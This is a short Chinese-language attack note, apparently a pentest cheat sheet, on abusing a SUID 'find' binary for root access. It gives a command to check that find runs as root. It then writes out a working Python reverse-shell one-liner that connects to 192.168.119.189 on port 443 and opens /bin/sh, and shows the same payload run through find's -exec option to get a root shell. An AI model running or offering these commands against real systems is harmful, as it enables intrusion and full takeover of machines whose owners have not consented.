# 确认 nmap 有 root 执行权限
执行命令
```
/usr/bin/find /tmp -exec whoami \;
```
确认 find 命令是否是 root 权限执行.

# 反弹 shell
1. 如果目标机上有 python 环境，可以使用 python 命令反弹 shell：
```
#反弹一个sh类型的shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.189",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
```
结合 find :
```
/usr/bin/find /tmp -exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.189",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \; 

```
